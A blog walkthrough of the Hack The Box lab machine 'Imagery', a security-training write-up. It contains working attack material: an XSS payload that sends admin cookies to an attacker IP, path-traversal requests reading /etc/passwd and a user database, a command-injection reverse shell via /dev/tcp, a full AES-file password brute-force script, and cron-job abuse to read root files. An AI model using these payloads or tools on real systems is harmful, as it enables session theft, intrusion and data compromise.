---
title: Imagery — HTB
author: Radeel Ahmad
pubDatetime: 2025-09-30T14:19:00Z
tags:
  - hacking
  - HTB
  - XSS
  - LFI
  - AES
description:
  Hack The Box "Imagery" walkthrough — stealing an admin cookie via stored XSS, LFI to leak db.json password hashes, command injection through an image transformation parameter, cracking an AES-encrypted backup, and abusing the Charcol backup CLI's cron scheduler for root.
---

### Imagery — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Imagery**'.

![](/blog/images/htb/1*lJ-X1S7rBp-MOKmmjMopMg.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
└─$ nmap -sC -sV 10.10.11.88
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 14:19 UTC
Nmap scan report for 10.10.11.88
Host is up (0.48s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.04 seconds
```

Update `etc/hosts`:

```
10.10.11.88 imagery.htb
```

![](/blog/images/htb/1*625xvJKcD4RQ77liu22mJw.png)

Register:

![](/blog/images/htb/1*m5kaSdyXKaiYQSimzSTz3Q.png)

After registration, we login.

![](/blog/images/htb/1*NgN6vbWToAjvAKKBbjcSEA.png)

We can upload image.

![](/blog/images/htb/1*ipuO91pT4KtAFBkVv1U-wQ.png)

Our user don't have the rights to transform the Images.

![](/blog/images/htb/1*-I4dyiAwxtSxq5psl2oMFA.png)

![](/blog/images/htb/1*xirsx-TcBhhHoDfglQCTkg.png)

Go to Report Bug.

![](/blog/images/htb/1*2aeBfP2kpuOqRUWdNh23wA.png)

We report a Bug and try an **XSS Payload.**

![](/blog/images/htb/1*zBc-QYEYXb1FgwWyjc3GbQ.png)

![](/blog/images/htb/1*jSjTwD-5eb8ZjsuFudEfYw.png)

Start the python Webserver.

```
python3 -m http.server 80
```

Use this payload to steal cookies.

```
<img src=1 onerror="document.location='http://10.10.14.13/steal/'+ document.cookie">
</img>
```

We got the cookies.

![](/blog/images/htb/1*WU8mtIfqPAz95bZQcaYdZg.png)

Replaced the application's session cookie `Application → Storage → Cookies` with the admin token.

After a refresh, we were logged in as Admin.

![](/blog/images/htb/1*SlMqUok9Jb1Y2H0y3I4KYw.png)

Admin Access:

![](/blog/images/htb/1*k9FI2hMdltiV-7gMh7ECMg.png)

We see 2 users, and every user can download the `log file`.

![](/blog/images/htb/1*W3p6RXzAZaX0ZmAbrh70hQ.png)

We intercepted the *Download Log* request and forwarded it to Repeater. The request looked like:

![](/blog/images/htb/1*_yBNzimBN94IhAcev3kZ9w.png)

To test for LFI, we set the `log_identifier` parameter to a path traversal payload:

```
GET /admin/get_system_log?log_identifier=../../../../etc/passwd
```

The request succeeded, confirming a local file inclusion vulnerability.

![](/blog/images/htb/1*tQQYX3M3u2P5g8_HmtlEcQ.png)

We look inside `db.json`.

```
GET /admin/get_system_log?log_identifier=../../../../home/web/web/db.json
```

We got 2 User Hashes.

![](/blog/images/htb/1*eX56yD3pa_jRc8iN_AqGJg.png)

```
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
```

We try to crack the Hashes at **crackstation.net**

We got the password:

![](/blog/images/htb/1*7K9Iq1LQydDXLlZsgqY4GA.png)

> testuser — iambatman

![](/blog/images/htb/1*cSjaGOonAZxnPtWAS9CRzQ.png)

Upload the image:

![](/blog/images/htb/1*b26SgGw3AxKMyN-GxMCU5w.png)

After the upload, clicking the three-dot menu displayed several available actions. This account seems to be a test or developer account, which could expose features that are either vulnerable or not fully secured.

![](/blog/images/htb/1*1b_df_mKwV1KisBZPHJPFA.png)

Select under Operation Crop, then Push Apply Transformation and catch the Response with Burpsuite.

![](/blog/images/htb/1*1Q0SOcCWnjyTOuqDuLo74A.png)

We need to put a Revshell on Parameter

![](/blog/images/htb/1*yHSdHFCmPfuOHDZM-26pSg.png)

Set this Payload for Revshell:

```
{
    "imageId":"1e849528-8768-45fa-89fd-d1a644649e30",
    "transformType":"crop",
    "params":{
            "x":";setsid /bin/bash -c \" /bin/bash -i >& /dev/tcp/10.10.14.13/4444 0>&1\";",
            "y":0,
            "width":1024,
            "height":682
             }
}
```

Start a listener and we got a shell.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
└─$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.88] 58898
bash: cannot set terminal process group (210399): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$whoami
web
web@Imagery:~/web$
```

We navigated to the `/var/backup` directory, and start Python web server.

```
web@Imagery:~/web$cd /var/backup
web@Imagery:/var/backup$python3 -m http.server 2222
```

Download the `web_20250806_120723.zip.aes` file

```
┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
└─$ wget http://10.10.11.88:2222/web_20250806_120723.zip.aes
--2025-09-30 15:48:12--  http://10.10.11.88:2222/web_20250806_120723.zip.aes
Connecting to 10.10.11.88:2222... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23054471 (22M) [application/octet-stream]
Saving to: 'web_20250806_120723.zip.aes'

web_20250806_120723.zip.aes          100%[===================================================================>]  21.99M  13.9KB/s    in 51m 38s

2025-09-30 16:39:51 (7.27 KB/s) - 'web_20250806_120723.zip.aes' saved [23054471/23054471]
```

We installed **pyAesCrypt** via pip

```
python3 -m pip install pyAesCrypt --break-system-packages
```

Use this Script to crack the AES File with Rockyou

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Brute-force wrapper for pyAesCrypt.decryptFile()
Supports wordlists and multiprocessing.
Uses 4-space indentation.
"""

import argparse
import multiprocessing as mp
import tempfile
import os
import sys
from os.path import isfile

import pyAesCrypt

BUFFER_SIZE = 64 * 1024  # match pyAesCrypt default

def _try_decrypt_worker(args):
    lineno, pw, infile = args
    fd, tmpname = tempfile.mkstemp(prefix="pyaesbf_", suffix=".tmp")
    os.close(fd)
    try:
        pyAesCrypt.decryptFile(infile, tmpname, pw, BUFFER_SIZE)
        return (lineno, pw, tmpname)
    except ValueError:
        try:
            os.remove(tmpname)
        except Exception:
            pass
        return None
    except IOError as e:
        try:
            os.remove(tmpname)
        except Exception:
            pass
        return ("__IOERR__", str(e))
    except Exception as e:
        try:
            os.remove(tmpname)
        except Exception:
            pass
        return ("__ERR__", str(e))

def pw_generator(wordlist_path, start=0):
    with open(wordlist_path, "rb") as f:
        for lineno, raw in enumerate(f):
            if lineno < start:
                continue
            pwb = raw.rstrip(b"\r\n")
            if not pwb:
                continue
            try:
                pw = pwb.decode("utf-8")
            except UnicodeDecodeError:
                pw = pwb.decode("latin-1", "ignore")
            yield (lineno, pw)

def main():
    parser = argparse.ArgumentParser(
        description=(
            "Brute-force decrypt AES Crypt v2 files with pyAesCrypt "
            "(wordlist + multiprocessing)"
        )
    )
    parser.add_argument("infile", help="Input .aes file")
    parser.add_argument("wordlist", help="Wordlist (e.g. /usr/share/wordlists/rockyou.txt)")
    parser.add_argument("-o", "--out", help="Output filename (defaults to infile without .aes)")
    parser.add_argument("-j", "--jobs", type=int, default=4, help="Number of worker processes (default: 4)")
    parser.add_argument("-s", "--start", type=int, default=0, help="Skip first N lines of the wordlist (resume)")
    args = parser.parse_args()

    if not isfile(args.infile):
        print("Error: input file not found:", args.infile, file=sys.stderr)
        sys.exit(1)
    if not isfile(args.wordlist):
        print("Error: wordlist not found:", args.wordlist, file=sys.stderr)
        sys.exit(1)

    if args.out:
        outname = args.out
    elif args.infile.endswith(".aes"):
        outname = args.infile[:-4]
    else:
        print('Error: please provide -o when input file does not end with ".aes"', file=sys.stderr)
        sys.exit(1)

    print(f"Starting brute-force: infile={args.infile} wordlist={args.wordlist} jobs={args.jobs} start={args.start}")
    print("Only run this on files you are authorized to test!")

    gen = pw_generator(args.wordlist, start=args.start)

    pool = mp.Pool(processes=max(1, args.jobs))
    try:
        def arg_iter():
            for lineno, pw in gen:
                yield (lineno, pw, args.infile)

        result_iter = pool.imap_unordered(_try_decrypt_worker, arg_iter(), chunksize=1)

        for res in result_iter:
            if res is None:
                continue

            if isinstance(res, tuple) and res and res[0] == "__IOERR__":
                print("IOError in worker:", res[1], file=sys.stderr)
                pool.terminate()
                pool.join()
                sys.exit(1)

            if isinstance(res, tuple) and res and res[0] == "__ERR__":
                print("Worker error:", res[1], file=sys.stderr)
                pool.terminate()
                pool.join()
                sys.exit(1)

            lineno, pw, tmpname = res
            print("\n*** SUCCESS ***")
            print("Line:", lineno)
            print("Password:", pw)

            try:
                os.replace(tmpname, outname)
                print("Decrypted file saved as:", outname)
            except Exception as e:
                print("Error moving output file:", e, file=sys.stderr)
                print("Temporary file kept at:", tmpname)

            pool.terminate()
            pool.join()
            return

        print("Finished wordlist — no password found.")
    except KeyboardInterrupt:
        print("\nAborted by user.")
        pool.terminate()
        pool.join()
        sys.exit(1)
    finally:
        try:
            pool.close()
        except Exception:
            pass
        try:
            pool.join()
        except Exception:
            pass

if __name__ == "__main__":
    main()
```

We performed a brute-force attack on the encrypted AES file using the custom Script with the rockyou wordlist.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
└─$ python3 aes-crack.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt -o web_20250806_120723.zip -j 1
Starting brute-force: infile=web_20250806_120723.zip.aes wordlist=/usr/share/wordlists/rockyou.txt jobs=1 start=0
Only run this on files you are authorized to test!

*** SUCCESS ***
Line: 669
Password: bestfriends
Error moving output file: [Errno 18] Invalid cross-device link: '/tmp/pyaesbf_i2fqi0e4.tmp' -> 'web_20250806_120723.zip'
Temporary file kept at: /tmp/pyaesbf_i2fqi0e4.tmp
```

We decrypted `web_20250806_120723.zip.aes` using **pyAesCrypt**

```
┌──(pycrypt-venv)─(kali㉿kali)-[~/Desktop/HTB/Imagery]
└─$ pyAesCrypt -d web_20250806_120723.zip.aes
Password:

┌──(pycrypt-venv)─(kali㉿kali)-[~/Desktop/HTB/Imagery/web]
└─$ ls
api_admin.py  api_edit.py    api_misc.py    app.py     db.json  __pycache__  templates
api_auth.py   api_manage.py  api_upload.py  config.py  env      system_logs  utils.py
```

After decryption, the file `web_20250806_120723.zip` was created and extracted, and opening `db.json` revealed the hash for the user **mark**.

```
┌──(pycrypt-venv)─(kali㉿kali)-[~/Desktop/HTB/Imagery/web]
└─$ cat db.json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
```

Crack the hash.

![](/blog/images/htb/1*izS7ajTKhEInARaAXr2t0A.png)

> mark:supersmash

Switch to the user mark

```
web@Imagery:/home$ ls
mark
web
web@Imagery:/home$ su mark
su mark
Password: supersmash
id
uid=1002(mark) gid=1002(mark) groups=1002(mark)
cd mark
ls
user.txt
cat user.txt
534a1c23df9***************
```

---

### Privilege Escalation

We enumerated sudo privileges

```
mark@Imagery:~$sudo -l
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

The Charcol CLI is a backup utility that includes an interactive shell (`shell`) and a password reset option (`-R` or `--reset-password-to-default`). According to its help text, the interactive shell provides a command interpreter for Charcol, while the reset flag restores the application password to its default state, requiring system password verification. From an attacker's perspective, both features are noteworthy — the interactive shell may reveal additional functionality when executed with elevated privileges, and the reset flag could allow changes to authentication if system verification can be bypassed.

```
mark@Imagery:~$ sudo /usr/local/bin/charcol --help
sudo /usr/local/bin/charcol --help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

Attempting to launch the Charcol interactive shell prompted for a master passphrase; after submitting empty responses three times the application exited and suggested using `--reset-password-to-default`.

```
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
sudo /usr/local/bin/charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password):

[2025-09-29 16:25:32] [ERROR] Error: Password/master key cannot be empty. Please try again.
[2025-09-29 16:25:32] [WARNING] Master passphrase cannot be empty. 2 retries left.
Enter your Charcol master passphrase (used to decrypt stored app password):

[2025-09-29 16:25:32] [ERROR] Error: Password/master key cannot be empty. Please try again.
[2025-09-29 16:25:32] [WARNING] Master passphrase cannot be empty. 1 retries left.
Enter your Charcol master passphrase (used to decrypt stored app password):

[2025-09-29 16:25:33] [ERROR] Error: Password/master key cannot be empty. Please try again.
[2025-09-29 16:25:33] [ERROR] Failed to provide a valid master passphrase after multiple attempts. Exiting application. If you forgot your master passphrase, please use the -R or --reset-password-to-default flag to reset the application password. (Error Code: CPD-001)
Please submit the log file and the above error details to error@charcol.com if the issue persists.
mark@Imagery:~$
```

The first attempt to start the Charcol shell with `sudo` failed because the master passphrase was empty. I then ran `sudo --reset-password-to-default`, confirmed using mark's system password, and put Charcol into no-password mode. I launched the Charcol shell twice; the second launch completed the initial setup and dropped me into the interactive Charcol shell (the shell filters which commands are allowed).

```
mark@Imagery:~$ sudo /usr/local/bin/charcol --reset-password-to-default
sudo /usr/local/bin/charcol --reset-password-to-default

Attempting to reset Charcol application password to default.
[2025-10-01 15:53:14] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2025-10-01 15:53:23] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

I pressed Enter at the initial prompt to select *no‑password* mode, and when asked to confirm the choice I typed `yes` to accept and enable no‑password mode.

```
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode:

Are you sure you want to use 'no password' mode? (yes/no):

Aborted 'no password' mode setup. Please choose again.
Enter '1' to set a new password, or press Enter to use 'no password' mode:

Are you sure you want to use 'no password' mode? (yes/no): yes
yes
[2025-10-01 15:54:07] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
```

We launched the Charcol interactive shell again, and this time, with the application set to *no-password mode*, we successfully accessed the Charcol shell interface.

```
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██
 ░██   ░░██ ░██                                                  ░██
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██

Charcol The Backup Suit - Development edition 1.0.0

[2025-10-01 15:54:14] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> import os; os.system("/bin/bash")
import os; os.system("/bin/bash")
[2025-10-01 15:54:25] [ERROR] Error: Command 'import' is not a recognized Charcol command in the interactive shell. Blocked.
charcol> help
help
[2025-10-01 15:54:33] [INFO]
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
    check <encrypted_file> [-p <file_password>] [--ask-password]
    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
    auto list
    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
    auto delete <job_id>

  Shell & Help:
    shell
    exit
    clear
    help [command]
```

Using `help` in the Charcol shell, we enumerated its commands and found task-scheduling capabilities; we then used the auto-add feature to create a cron job that copied `/root/root.txt` to `/tmp` with readable permissions, which allowed us to retrieve the root flag.

```
charcol>auto add --schedule "*/1 * * * *" --command "/bin/cp /root/root.txt /tmp/root.txt && /bin/chmod 644 /tmp/root.txt" --name "copy_root_readable" --log-output /tmp/copy_root_perm.log
<root_readable" --log-output /tmp/copy_root_perm.log
[2025-10-01 15:54:47] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2025-10-01 15:54:57] [INFO] System password verified successfully.
[2025-10-01 15:54:57] [INFO] Auto job 'copy_root_readable' (ID: 4736cfc8-a37b-4824-9af9-1f4d95053ccb) added successfully. The job will run according to schedule.
[2025-10-01 15:54:57] [INFO] Cron line added: */1 * * * * CHARCOL_NON_INTERACTIVE=true /bin/cp /root/root.txt /tmp/root.txt && /bin/chmod 644 /tmp/root.txt >> /tmp/copy_root_perm.log 2>&1
charcol>exit
exit
[2025-10-01 15:55:06] [INFO] Exiting Charcol shell.
mark@Imagery:~$ cat /tmp/root.txt
cat /tmp/root.txt
6872dc8e647073**********
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
